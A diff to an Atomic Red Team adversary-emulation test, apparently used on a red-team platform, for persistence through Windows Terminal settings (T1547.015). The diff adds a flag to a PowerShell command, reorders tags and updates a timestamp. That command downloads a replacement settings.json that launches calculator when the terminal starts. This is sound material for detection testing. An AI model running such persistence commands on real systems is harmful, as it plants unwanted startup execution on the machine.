@@ -14,8 +14,8 @@
           -ErrorAction Ignore; Write-Output ""; $?) -and $(winget install --id=Microsoft.WindowsTerminal);
           fi; mv ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
           ~\AppData\Local\Temp\settings.json; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"
-          -OutFile "~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json";
-          wt.exe'
+          -OutFile "~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"
+          -UseBasicParsing; wt.exe'
         cleanup: 'mv -Force #{settings_json_tmp} #{settings_json_def}; taskkill /F
           /IM "#{calculator}" > $null'
   plugin: atomic
@@ -24,8 +24,8 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - t1547.015
+  - atomic-red-team
   - persistence
   author: Atomic Red Team
   additional_info:
@@ -60,4 +60,4 @@
         '
     technique_created: '2021-10-05T21:26:15.081Z'
     atomic_guid: ec5d76ef-82fe-48da-b931-bdb25a62bc65
-    import_timestamp: '2026-10-20T07:08:28.842009Z'
+    import_timestamp: '2026-10-21T07:01:50.943218Z'
